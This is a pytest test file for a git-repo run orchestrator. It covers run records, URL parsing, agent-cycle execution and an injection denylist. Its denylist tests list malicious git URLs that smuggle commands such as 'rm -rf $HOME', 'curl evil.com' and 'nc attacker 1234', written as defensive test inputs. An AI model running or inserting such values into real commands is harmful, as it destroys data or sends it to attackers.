"""Tests for scripts/run.py — CRUD + orchestrator integration."""

from __future__ import annotations

from pathlib import Path

import pytest

import scripts.run as run_mod
from scripts.migrate import MIGRATIONS_DIR, apply_migrations
from scripts.project import create_project
from scripts.run import (
    _cmd_create_run_only,
    create_run,
    finalize_run,
    get_run,
    list_runs,
    orchestrate_run,
    update_run_branch,
)


@pytest.fixture
def db(tmp_path) -> str:
    db_path = str(tmp_path / "kaizen.db")
    apply_migrations(db_path, MIGRATIONS_DIR)
    return db_path


@pytest.fixture
def project(db) -> dict:
    return create_project(
        db,
        git_url="https://github.com/owner/repo.git",
        name="repo",
        base_branch="main",
        test_command="pytest",
        read_paths=[],
        expert_roster=[],
        language="python",
    )


# ── Run CRUD ───────────────────────────────────────────────────────────────


def test_create_run_inserts_row(db, project):
    row = create_run(
        db,
        project_id=project["id"],
        branch="kaizen/x-2026-05-16-1200",
        cycles_requested=3,
        subject="x",
    )
    assert row["id"] >= 1
    assert row["project_id"] == project["id"]
    assert row["branch"] == "kaizen/x-2026-05-16-1200"
    assert row["cycles_requested"] == 3
    assert row["cycles_succeeded"] == 0
    assert row["cycles_abandoned"] == 0
    assert row["subject"] == "x"
    assert row["status"] == "running"
    assert row["pr_url"] is None
    assert row["ended_at"] is None
    assert row["started_at"]


def test_finalize_run_updates_counts_and_status(db, project):
    row = create_run(db, project["id"], "b", 5, None)
    updated = finalize_run(
        db,
        row["id"],
        cycles_succeeded=4,
        cycles_abandoned=1,
        pr_url="https://github.com/owner/repo/pull/42",
        status="complete",
    )
    assert updated["cycles_succeeded"] == 4
    assert updated["cycles_abandoned"] == 1
    assert updated["pr_url"] == "https://github.com/owner/repo/pull/42"
    assert updated["status"] == "complete"
    assert updated["ended_at"]


def test_get_run_returns_row_or_none(db, project):
    row = create_run(db, project["id"], "b", 1, None)
    assert get_run(db, row["id"])["id"] == row["id"]
    assert get_run(db, 99_999) is None


def test_list_runs_filters_by_project_id(db, project):
    other = create_project(
        db,
        git_url="https://github.com/x/y.git",
        name="y",
        base_branch="main",
        test_command="pytest",
        read_paths=[],
        expert_roster=[],
        language="python",
    )
    create_run(db, project["id"], "a", 1, None)
    create_run(db, project["id"], "b", 1, None)
    create_run(db, other["id"], "c", 1, None)

    all_rows = list_runs(db)
    assert len(all_rows) == 3

    project_rows = list_runs(db, project_id=project["id"])
    assert len(project_rows) == 2
    assert all(r["project_id"] == project["id"] for r in project_rows)


# ── URL parsing ────────────────────────────────────────────────────────────


def test_parse_owner_repo_https():
    assert run_mod.parse_owner_repo("https://github.com/owner/repo.git") == ("owner", "repo")
    assert run_mod.parse_owner_repo("https://github.com/owner/repo") == ("owner", "repo")


def test_parse_owner_repo_ssh():
    assert run_mod.parse_owner_repo("git@github.com:owner/repo.git") == ("owner", "repo")


def test_parse_owner_repo_raises_on_garbage():
    with pytest.raises(ValueError):
        run_mod.parse_owner_repo("not a url")


# ── validate_git_url — B-INJ-1 shell-metacharacter denylist ──────────────


def test_validate_git_url_accepts_well_formed_https():
    run_mod.validate_git_url("https://github.com/owner/repo.git")
    run_mod.validate_git_url("https://github.com/owner/repo")
    run_mod.validate_git_url("https://gitlab.example.com/group/project.git")


def test_validate_git_url_accepts_well_formed_ssh():
    run_mod.validate_git_url("git@github.com:owner/repo.git")
    run_mod.validate_git_url("user@host.example.com:org/proj")


@pytest.mark.parametrize(
    "malicious",
    [
        # B-INJ-1 attack catalogue.
        "https://x; rm -rf $HOME #",
        "https://x.com/o/r.git; touch /tmp/pwned",
        "https://x.com/o/r.git && curl evil.com",
        "https://x.com/o/r.git | nc attacker 1234",
        "https://x.com/$(rm -rf .)/r.git",
        "https://x.com/`rm -rf .`/r.git",
        "https://x.com/o/r.git\ntouch /tmp/pwned",
        "https://x.com/o/r.git\rcarriage",
        'https://x.com/o/r"or"1=1',
        "https://x.com/o/r'or'1=1",
        "https://x.com/o/r\\backslash",
        "https://x.com/o /r",  # embedded space
        "https://x.com/o/r<redirect.txt",
        "https://x.com/o/r>redirect.txt",
        # Control char (NUL).
        "https://x.com/o/r\x00",
    ],
)
def test_validate_git_url_rejects_shell_metacharacters(malicious):
    with pytest.raises(ValueError):
        run_mod.validate_git_url(malicious)


def test_validate_git_url_rejects_empty_and_none():
    with pytest.raises(ValueError):
        run_mod.validate_git_url("")
    with pytest.raises(ValueError):
        run_mod.validate_git_url(None)  # type: ignore[arg-type]


def test_create_run_only_refuses_malicious_url(db, capsys):
    """B-INJ-1 end-to-end: a malicious URL fed into _cmd_create_run_only
    must exit non-zero with an actionable error, BEFORE touching the
    projects table."""
    code = _cmd_create_run_only(["https://x; rm -rf $HOME #", "1"], db_path=db)
    assert code == 1
    err = capsys.readouterr().err
    assert "invalid git_url" in err


def test_create_run_only_refuses_command_substitution_in_url(db, capsys):
    code = _cmd_create_run_only(["https://x.com/$(touch /tmp/pwned)/r.git", "1"], db_path=db)
    assert code == 1
    err = capsys.readouterr().err
    assert "invalid git_url" in err


def test_create_run_only_refuses_pipe_in_url(db, capsys):
    code = _cmd_create_run_only(["https://x.com/o/r.git | nc evil 9999", "1"], db_path=db)
    assert code == 1
    err = capsys.readouterr().err
    assert "invalid git_url" in err


# ── Orchestrator tests ─────────────────────────────────────────────────────


def _install_orchestrator_stubs(monkeypatch, tmp_path):
    """Stub clone/seed/branch/push so the orchestrator doesn't touch real git."""
    clone_dir = tmp_path / "experiment" / "owner-repo"

    def fake_clone(remote_url, dest, branch):
        dest.mkdir(parents=True, exist_ok=True)

    monkeypatch.setattr(run_mod, "kaizen_root", lambda: tmp_path)
    # The clone helper is imported inside orchestrate_run; patch at the
    # source module so the import sees our stub.
    import scripts.clone as clone_mod

    monkeypatch.setattr(clone_mod, "clone_repo", fake_clone)

    import scripts.seed_atelier_in_clone as seed_mod

    monkeypatch.setattr(seed_mod, "seed_all", lambda d: None)

    import scripts.cycle_git as cg_mod

    monkeypatch.setattr(
        cg_mod,
        "create_branch",
        lambda d, subj: f"kaizen/{(subj or 'pm-directed').replace(' ', '-')}-2026-05-16-1200",
    )
    monkeypatch.setattr(cg_mod, "push_branch", lambda d, b: None)

    return clone_dir


def test_orchestrate_run_unknown_url_raises(db, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    with pytest.raises(RuntimeError) as exc_info:
        orchestrate_run(
            db_path=db,
            git_url="https://github.com/nope/none.git",
            cycles_requested=1,
            cycle_executor=lambda *a: {
                "status": "success",
                "commit_sha": "x",
                "minutes_memex_slug": None,
            },
        )
    assert "project.py register" in str(exc_info.value)


def test_orchestrate_run_happy_path_with_fake_executor(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    calls = []

    def fake_executor(clone_dir, proj, run_row, cycle_n):
        calls.append(cycle_n)
        return {
            "status": "success",
            "commit_sha": f"sha-{cycle_n}",
            "minutes_memex_slug": f"kaizen:cycle:fake-{cycle_n}",
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=3,
        subject="docs cleanup",
        cycle_executor=fake_executor,
    )
    assert calls == [1, 2, 3]
    assert result["status"] == "complete"
    assert result["cycles_succeeded"] == 3
    assert result["cycles_abandoned"] == 0
    assert len(result["cycles"]) == 3
    assert all(c["status"] == "success" for c in result["cycles"])
    assert result["abandonments"] == []
    # The finalized run row reflects the counts.
    final = get_run(db, result["run_id"])
    assert final["status"] == "complete"
    assert final["cycles_succeeded"] == 3


def test_orchestrate_run_mixed_outcomes(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def fake_executor(clone_dir, proj, run_row, cycle_n):
        if cycle_n == 2:
            return {
                "status": "abandoned",
                "phase_reached": "meeting",
                "reason": "no_consensus",
                "detail": "agents disagreed",
                "participants": ["pm", "backend-engineer-1"],
                "artifacts": [],
            }
        return {
            "status": "success",
            "commit_sha": f"sha-{cycle_n}",
            "minutes_memex_slug": None,
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=3,
        cycle_executor=fake_executor,
    )
    assert result["cycles_succeeded"] == 2
    assert result["cycles_abandoned"] == 1
    assert result["status"] == "complete"
    assert len(result["abandonments"]) == 1
    ab = result["abandonments"][0]
    # The abandonment must reference the cycle row for cycle_n=2.
    cycle_2 = next(c for c in result["cycles"] if c["cycle_n"] == 2)
    assert ab["cycle_id"] == cycle_2["id"]
    assert ab["reason"] == "no_consensus"


def test_orchestrate_run_all_abandoned(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def fake_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "abandoned",
            "phase_reached": "agenda",
            "reason": "other",
            "detail": f"cycle {cycle_n} bailed",
            "participants": [],
            "artifacts": [],
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=3,
        cycle_executor=fake_executor,
    )
    assert result["cycles_succeeded"] == 0
    assert result["cycles_abandoned"] == 3
    assert result["status"] == "complete"  # still successful at the run level
    assert len(result["abandonments"]) == 3


def test_orchestrate_run_removes_stale_experiment_dir(db, project, tmp_path, monkeypatch):
    """H2: a pre-existing experiment_dir from a crashed prior run must be
    removed before clone_repo runs, so `git clone` doesn't fail with
    'destination path already exists'."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    # Pre-create a stale clone dir with a sentinel file inside.
    stale_dir = tmp_path / "experiment" / "owner-repo"
    stale_dir.mkdir(parents=True, exist_ok=True)
    sentinel = stale_dir / "STALE_SENTINEL.txt"
    sentinel.write_text("leftover from a previous crashed run")
    assert sentinel.exists()

    # Wrap fake_clone so we can confirm it was called with the expected args
    # *after* the stale-dir cleanup happened.
    clone_calls: list[tuple] = []

    def fake_clone(remote_url, dest, branch):
        clone_calls.append((remote_url, dest, branch))
        # The sentinel must already be gone by the time clone runs.
        assert not sentinel.exists(), "stale experiment_dir was not cleaned before clone_repo ran"
        dest.mkdir(parents=True, exist_ok=True)

    import scripts.clone as clone_mod

    monkeypatch.setattr(clone_mod, "clone_repo", fake_clone)

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        cycle_executor=lambda *a: {
            "status": "success",
            "commit_sha": "x",
            "minutes_memex_slug": None,
        },
    )

    # The sentinel must be gone (proves rmtree happened).
    assert not sentinel.exists()
    # fake_clone must have been invoked with the right args.
    assert len(clone_calls) == 1
    remote_url, dest, branch = clone_calls[0]
    assert remote_url == project["git_url"]
    assert dest == stale_dir
    assert branch == project["base_branch"]
    assert result["status"] == "complete"


def test_orchestrate_run_cleans_up_on_seed_failure(db, project, tmp_path, monkeypatch):
    """M1: if seed_all raises, experiment_dir must be torn down before the
    exception propagates so the next run isn't blocked by a half-initialized
    clone."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    # Stub clone to materialize the experiment_dir on disk.
    import scripts.clone as clone_mod

    experiment_dir = tmp_path / "experiment" / "owner-repo"

    def fake_clone(remote_url, dest, branch):
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "marker.txt").write_text("clone artefact")

    monkeypatch.setattr(clone_mod, "clone_repo", fake_clone)

    # Stub seed_all to raise.
    import scripts.seed_atelier_in_clone as seed_mod

    def boom_seed(_d):
        raise RuntimeError("seed boom")

    monkeypatch.setattr(seed_mod, "seed_all", boom_seed)

    with pytest.raises(RuntimeError, match="seed boom"):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=lambda *a: {
                "status": "success",
                "commit_sha": "x",
                "minutes_memex_slug": None,
            },
        )

    # The half-initialized clone must have been removed.
    assert not experiment_dir.exists()


def test_orchestrate_run_finalizes_failed_run_on_cycle_exception(
    db, project, tmp_path, monkeypatch
):
    """H3: an unhandled exception inside the cycle loop must finalize the
    runs row at status='failed' (with partial counts) before re-raising,
    so the DB is never left with a row stuck at status='running'."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def boom_executor(clone_dir, proj, run_row, cycle_n):
        raise RuntimeError("cycle boom")

    with pytest.raises(RuntimeError, match="cycle boom"):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=3,
            cycle_executor=boom_executor,
        )

    # Exactly one runs row was created for this project; pick it up.
    rows = list_runs(db, project_id=project["id"])
    assert len(rows) == 1
    final = rows[0]
    assert final["status"] == "failed"
    # The crash happened on cycle 1 before any progress was recorded, so
    # both counters must still be zero on the persisted row.
    assert final["cycles_succeeded"] == 0
    assert final["cycles_abandoned"] == 0
    # ended_at must be populated — finalize_run was called.
    assert final["ended_at"] is not None


def test_orchestrate_run_skip_and_continue_on_abandonment(db, project, tmp_path, monkeypatch):
    """Skip-and-continue policy: alternating abandoned/success over 4 cycles.

    Verifies:
    - The orchestrator does NOT abort after the first abandonment (all 4
      cycles run).
    - cycles_succeeded == 2, cycles_abandoned == 2.
    - 4 cycle rows in the DB with statuses ['abandoned','success','abandoned','success']
      in cycle_n order.
    - 2 abandonment rows in the DB linked to the correct cycle rows.
    - The run is finalised at status='complete'.
    """
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    cycles_called: list[int] = []

    def stub_cycle_executor(clone_dir, proj, run_row, cycle_n):
        cycles_called.append(cycle_n)
        if cycle_n % 2 == 1:  # odd → abandoned
            return {
                "status": "abandoned",
                "subject": None,
                "phase_reached": "meeting",
                "reason": "no_consensus",
                "detail": f"stubbed abandonment for cycle {cycle_n}",
                "participants": ["stub"],
                "artifacts": [],
            }
        # even → success
        return {
            "status": "success",
            "subject": None,
            "commit_sha": "stub" + str(cycle_n),
            "minutes_memex_slug": f"stub:{cycle_n}",
            "participants": ["stub"],
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=4,
        cycle_executor=stub_cycle_executor,
    )

    # All 4 cycles ran — loop did NOT abort after first abandonment.
    assert cycles_called == [1, 2, 3, 4], f"Expected all 4 cycles called, got {cycles_called}"

    # Top-level counts.
    assert result["cycles_succeeded"] == 2
    assert result["cycles_abandoned"] == 2
    assert result["status"] == "complete"

    # Cycle rows: 4 total, statuses in cycle_n order.
    cycle_rows = result["cycles"]
    assert len(cycle_rows) == 4
    expected_statuses = ["abandoned", "success", "abandoned", "success"]
    actual_statuses = [c["status"] for c in sorted(cycle_rows, key=lambda c: c["cycle_n"])]
    assert actual_statuses == expected_statuses

    # Abandonment rows: 2, linked to the correct cycle rows.
    ab_rows = result["abandonments"]
    assert len(ab_rows) == 2

    abandoned_cycle_ids = {c["id"] for c in cycle_rows if c["status"] == "abandoned"}
    ab_cycle_ids = {ab["cycle_id"] for ab in ab_rows}
    assert ab_cycle_ids == abandoned_cycle_ids

    # Each abandonment row carries the correct reason.
    assert all(ab["reason"] == "no_consensus" for ab in ab_rows)

    # Verify DB state directly — run row must be finalised as complete.
    final_run = get_run(db, result["run_id"])
    assert final_run["status"] == "complete"
    assert final_run["cycles_succeeded"] == 2
    assert final_run["cycles_abandoned"] == 2
    assert final_run["ended_at"] is not None

    # Verify abandonment rows exist in DB (not just in-memory list).
    from scripts.db import get_connection

    conn = get_connection(db)
    try:
        cur = conn.execute(
            "SELECT cycle_id FROM abandonments WHERE cycle_id IN "
            f"({','.join('?' * len(abandoned_cycle_ids))})",
            list(abandoned_cycle_ids),
        )
        db_ab_cycle_ids = {row[0] for row in cur.fetchall()}
    finally:
        conn.close()
    assert db_ab_cycle_ids == abandoned_cycle_ids


def test_orchestrate_run_mode_returned_in_result(db, project, tmp_path, monkeypatch):
    """The `mode` key must appear in the result dict for both modes."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def fake_executor(*a):
        return {
            "status": "success",
            "commit_sha": "sha-1",
            "minutes_memex_slug": None,
        }

    for mode in ("subagent", "team"):
        result = orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=fake_executor,  # injected → bypasses mode-based selection
            mode=mode,
        )
        assert result["mode"] == mode, (
            f"Expected mode={mode!r} in result, got {result.get('mode')!r}"
        )


def test_orchestrate_run_selects_team_executor_when_mode_team(db, project, tmp_path, monkeypatch):
    """When mode='team' and no cycle_executor is injected, orchestrate_run
    must select team_cycle_executor — and require a tools_provider.

    Previously the orchestrator selected team_cycle_executor and let it crash
    deep inside the cycle (after clone/seed/branch/create_run side effects).
    With the bridge-team-mode-integration-gap fix, the orchestrator now
    raises ValueError BEFORE any of those side effects when no
    tools_provider is supplied. This test pins the new fail-fast contract.
    """
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    # No cycle_executor injected AND no tools_provider → orchestrator raises
    # ValueError naming both 'tools_provider' and "mode='team'".
    with pytest.raises(ValueError) as exc_info:
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            mode="team",
            # no cycle_executor — forces mode-based selection
            # no tools_provider — triggers the bridge guard
        )

    msg = str(exc_info.value)
    assert "tools_provider" in msg, f"error must name tools_provider; got: {msg}"
    assert "mode='team'" in msg or "mode=team" in msg, f"error must name mode='team'; got: {msg}"

    # CONTRACT CHANGE: the guard fires BEFORE create_run, so NO run row
    # exists. This is the whole point of the bridge fix — fail fast with no
    # garbage on disk or in the DB.
    rows = list_runs(db, project_id=project["id"])
    assert rows == [], f"guard must fire before create_run; got rows={rows}"


# ── tools_provider bridging (team mode integration gap) ───────────────────


def _success_outcome(cycle_n):
    return {
        "status": "success",
        "commit_sha": f"sha-{cycle_n}",
        "minutes_memex_slug": f"kaizen:cycle:fake-{cycle_n}",
    }


def test_orchestrate_run_subagent_mode_ignores_tools_provider(db, project, tmp_path, monkeypatch):
    """mode='subagent' must NEVER invoke the tools_provider — even when one
    is passed — and must NEVER pass `tools=` into the cycle executor.

    The subagent path is the unmodified back-compat surface; legacy callers
    that accept 4 positional args must keep working.
    """
    import os

    from scripts.team_tools_wrapper import RecordingWrapper

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    provider_calls: list[tuple] = []

    def provider(clone_dir, proj, run_row, cycle_n):
        provider_calls.append((clone_dir, proj, run_row, cycle_n))
        return RecordingWrapper()

    executor_calls: list[dict] = []

    def fake_executor(*args, **kwargs):
        executor_calls.append({"args": args, "kwargs": kwargs})
        # Match a 4-positional-arg signature exactly — no `tools` kwarg expected.
        assert "tools" not in kwargs, (
            f"subagent mode must not pass tools= kwarg; got kwargs={kwargs}"
        )
        assert len(args) == 4, (
            f"subagent mode must call executor with 4 positional args; got {args}"
        )
        return _success_outcome(args[3])

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=2,
        cycle_executor=fake_executor,
        mode="subagent",
        tools_provider=provider,
    )

    assert result["status"] == "complete"
    assert result["cycles_succeeded"] == 2
    # Provider is NEVER invoked in subagent mode.
    assert provider_calls == [], (
        f"tools_provider must not be invoked in subagent mode; got {provider_calls}"
    )
    # Executor was called once per cycle, all-positional.
    assert len(executor_calls) == 2


def test_orchestrate_run_team_mode_without_tools_provider_raises(
    db, project, tmp_path, monkeypatch
):
    """mode='team' + tools_provider=None must raise ValueError naming both
    'tools_provider' and 'mode=team' BEFORE any run row is created.
    """
    import os

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    runs_before = list_runs(db, project_id=project["id"])

    with pytest.raises(ValueError) as exc_info:
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            mode="team",
            tools_provider=None,
        )

    msg = str(exc_info.value)
    assert "tools_provider" in msg, f"error must mention 'tools_provider'; got: {msg}"
    assert "mode='team'" in msg or "mode=team" in msg, f"error must mention mode='team'; got: {msg}"

    # No new runs row was created — the guard fired before create_run.
    runs_after = list_runs(db, project_id=project["id"])
    assert len(runs_after) == len(runs_before), (
        f"guard must fire BEFORE create_run; runs went from {len(runs_before)} → {len(runs_after)}"
    )


def test_orchestrate_run_team_mode_without_tools_provider_raises_before_clone(
    db, project, tmp_path, monkeypatch
):
    """The team-mode-without-provider guard must fire BEFORE clone_repo,
    seed_all, or create_branch run. None of those side effects may
    materialise on disk.
    """
    import os

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    # Wrap the stubs to record whether they were touched.
    clone_calls: list = []
    seed_calls: list = []
    branch_calls: list = []

    import scripts.clone as clone_mod
    import scripts.cycle_git as cg_mod
    import scripts.seed_atelier_in_clone as seed_mod

    orig_clone = clone_mod.clone_repo
    orig_seed = seed_mod.seed_all
    orig_branch = cg_mod.create_branch

    def spy_clone(*a, **kw):
        clone_calls.append((a, kw))
        return orig_clone(*a, **kw)

    def spy_seed(*a, **kw):
        seed_calls.append((a, kw))
        return orig_seed(*a, **kw)

    def spy_branch(*a, **kw):
        branch_calls.append((a, kw))
        return orig_branch(*a, **kw)

    monkeypatch.setattr(clone_mod, "clone_repo", spy_clone)
    monkeypatch.setattr(seed_mod, "seed_all", spy_seed)
    monkeypatch.setattr(cg_mod, "create_branch", spy_branch)

    experiment_dir = tmp_path / "experiment" / "owner-repo"

    with pytest.raises(ValueError, match="tools_provider"):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            mode="team",
            tools_provider=None,
        )

    # No clone, no seed, no branch — and no experiment dir on disk.
    assert clone_calls == [], f"clone_repo must not run when guard fires; got {clone_calls}"
    assert seed_calls == [], f"seed_all must not run when guard fires; got {seed_calls}"
    assert branch_calls == [], f"create_branch must not run when guard fires; got {branch_calls}"
    assert not experiment_dir.exists(), (
        f"experiment_dir must not exist after guard fires; found {experiment_dir}"
    )


def test_orchestrate_run_team_mode_with_tools_provider_threads_through(
    db, project, tmp_path, monkeypatch
):
    """Provider is invoked once per cycle with the SAME (clone_dir, project,
    run_row) and DIFFERENT cycle_n values monotonically increasing.
    """
    import os

    from scripts.team_tools_wrapper import RecordingWrapper

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    provider_calls: list[tuple] = []

    def provider(clone_dir, proj, run_row, cycle_n):
        provider_calls.append((clone_dir, proj, run_row, cycle_n))
        return RecordingWrapper()

    def fake_executor(clone_dir, proj, run_row, cycle_n, *, tools):
        # Sanity: tools is the RecordingWrapper returned by our provider.
        assert isinstance(tools, RecordingWrapper)
        return _success_outcome(cycle_n)

    cycles_requested = 3
    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=cycles_requested,
        cycle_executor=fake_executor,
        mode="team",
        tools_provider=provider,
    )

    assert result["status"] == "complete"
    assert result["cycles_succeeded"] == cycles_requested
    # One provider call per cycle.
    assert len(provider_calls) == cycles_requested

    # cycle_n monotonically increasing 1..N.
    cycle_ns = [c[3] for c in provider_calls]
    assert cycle_ns == list(range(1, cycles_requested + 1))

    # clone_dir + project + run_row are the SAME object across all calls.
    clone_dirs = {id(c[0]) for c in provider_calls}
    projects = {id(c[1]) for c in provider_calls}
    run_rows = {id(c[2]) for c in provider_calls}
    assert len(clone_dirs) == 1, "clone_dir must be the same object across provider calls"
    assert len(projects) == 1, "project must be the same object across provider calls"
    assert len(run_rows) == 1, "run_row must be the same object across provider calls"


def test_orchestrate_run_team_mode_provider_receives_correct_args(
    db, project, tmp_path, monkeypatch
):
    """The 4 args the provider receives are (Path, dict, dict, int) with the
    project + run_row dicts populated as expected.
    """
    import os

    from scripts.team_tools_wrapper import RecordingWrapper

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    captured: dict = {}

    def provider(clone_dir, proj, run_row, cycle_n):
        captured["clone_dir"] = clone_dir
        captured["project"] = proj
        captured["run_row"] = run_row
        captured["cycle_n"] = cycle_n
        return RecordingWrapper()

    def fake_executor(*args, **kwargs):
        return _success_outcome(args[3])

    orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        cycle_executor=fake_executor,
        mode="team",
        tools_provider=provider,
    )

    # Type shape checks.
    assert isinstance(captured["clone_dir"], Path)
    assert isinstance(captured["project"], dict)
    assert isinstance(captured["run_row"], dict)
    assert isinstance(captured["cycle_n"], int)
    assert captured["cycle_n"] == 1

    # Project dict has the expected keys.
    for key in ("id", "git_url", "base_branch", "expert_roster"):
        assert key in captured["project"], (
            f"project dict missing expected key {key!r}: {captured['project']}"
        )

    # Run row has the expected keys.
    assert "id" in captured["run_row"]
    assert "branch" in captured["run_row"]
    assert isinstance(captured["run_row"]["id"], int)
    assert isinstance(captured["run_row"]["branch"], str)


def test_orchestrate_run_team_mode_executor_receives_tools_kwarg(
    db, project, tmp_path, monkeypatch
):
    """The executor must receive the wrapper instance as a `tools=` kwarg
    (NOT positional), and the value passed must be the SAME instance the
    provider returned on that cycle.
    """
    import os

    from scripts.team_tools_wrapper import RecordingWrapper

    _install_orchestrator_stubs(monkeypatch, tmp_path)
    monkeypatch.setitem(os.environ, "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS", "1")

    produced_wrappers: list[RecordingWrapper] = []

    def provider(clone_dir, proj, run_row, cycle_n):
        wrapper = RecordingWrapper()
        produced_wrappers.append(wrapper)
        return wrapper

    spy_calls: list[dict] = []

    def spy_executor(*args, **kwargs):
        spy_calls.append({"args": args, "kwargs": dict(kwargs)})
        # tools MUST be a kwarg, never positional.
        assert "tools" in kwargs, f"expected tools= kwarg; got args={args} kwargs={kwargs}"
        # The args tuple is exactly (clone_dir, project, run_row, cycle_n).
        assert len(args) == 4, f"expected 4 positional args; got {args}"
        return _success_outcome(args[3])

    cycles_requested = 2
    orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=cycles_requested,
        cycle_executor=spy_executor,
        mode="team",
        tools_provider=provider,
    )

    assert len(spy_calls) == cycles_requested
    assert len(produced_wrappers) == cycles_requested
    for i, call in enumerate(spy_calls):
        assert call["kwargs"]["tools"] is produced_wrappers[i], (
            f"cycle {i + 1}: executor received a different wrapper instance than the "
            "provider returned"
        )


def test_orchestrate_run_push_failure_leaves_clone(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    import scripts.cycle_git as cg_mod

    def boom(clone_dir, branch):
        raise RuntimeError("push refused")

    monkeypatch.setattr(cg_mod, "push_branch", boom)

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        cycle_executor=lambda *a: {
            "status": "success",
            "commit_sha": "x",
            "minutes_memex_slug": None,
        },
    )
    assert result["status"] == "failed"
    assert "push refused" in result["error"]
    # Clone dir should still exist on disk (push failed → leave for recovery).
    assert Path(result["clone_dir"]).exists()
    # Run row should record status='failed'.
    final = get_run(db, result["run_id"])
    assert final["status"] == "failed"


# ── phase_reached fail-loud + CHECK-positive regression guard ─────────────


_ALL_VALID_PHASES = ("agenda", "meeting", "implementation", "test", "review", "push")
_ALL_VALID_REASONS = (
    "no_consensus",
    "destructive_rejected",
    "tests_unrecoverable",
    "review_unrecoverable",
    "other",
)


def _assert_all_phases_in_message(msg: str) -> None:
    """Every legal phase MUST appear in the error so the operator gets the
    full repair menu, not a hint. Coupled to the sorted(VALID_PHASES)
    formatting in scripts/run.py."""
    for phase in _ALL_VALID_PHASES:
        assert phase in msg, f"phase {phase!r} missing from error message: {msg}"


def _assert_all_reasons_in_message(msg: str) -> None:
    """Every legal reason MUST appear in the error so the operator gets the
    full repair menu. Coupled to the sorted(VALID_REASONS) formatting."""
    for reason in _ALL_VALID_REASONS:
        assert reason in msg, f"reason {reason!r} missing from error message: {msg}"


def test_orchestrate_run_raises_when_phase_reached_missing(db, project, tmp_path, monkeypatch):
    """A malformed abandonment outcome (missing phase_reached) must raise
    ValueError naming the field — NOT crash later inside record_abandonment
    with sqlite3.IntegrityError after work was done.

    The previous default of "unknown" silently violated the CHECK constraint
    in migration 004 (which only permits agenda|meeting|implementation|test|
    review|push). This test pins the fail-loud contract.
    """
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def malformed_executor(clone_dir, proj, run_row, cycle_n):
        # Intentionally omit phase_reached → triggers the orchestrator's
        # fail-loud guard.
        return {
            "status": "abandoned",
            "reason": "other",
            "detail": "executor forgot phase_reached",
            "participants": [],
            "artifacts": [],
        }

    with pytest.raises(ValueError, match="phase_reached") as exc_info:
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=malformed_executor,
        )
    msg = str(exc_info.value)
    # The error message must name the cycle so the operator can locate it.
    assert "cycle 1" in msg
    # And must enumerate EVERY schema-allowed phase value so the fix is obvious.
    _assert_all_phases_in_message(msg)

    # H3: the orchestrator's outer try/except must still finalise the run
    # as 'failed' even though our ValueError fired mid-loop.
    rows = list_runs(db, project_id=project["id"])
    assert len(rows) == 1
    assert rows[0]["status"] == "failed"


def test_orchestrate_run_raises_when_phase_reached_is_unknown(db, project, tmp_path, monkeypatch):
    """The original bug class: executor returns phase_reached="unknown" (the
    old default sentinel). Must raise ValueError at the orchestrator layer
    BEFORE any DB write — not bypass the guard, not crash later with
    sqlite3.IntegrityError after work was done.
    """
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def bad_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "abandoned",
            "phase_reached": "unknown",  # explicit invalid sentinel
            "reason": "other",
            "detail": "executor used legacy 'unknown' sentinel",
            "participants": [],
            "artifacts": [],
        }

    with pytest.raises(ValueError, match="phase_reached") as exc_info:
        orchestrate_run(
            db_path=db,
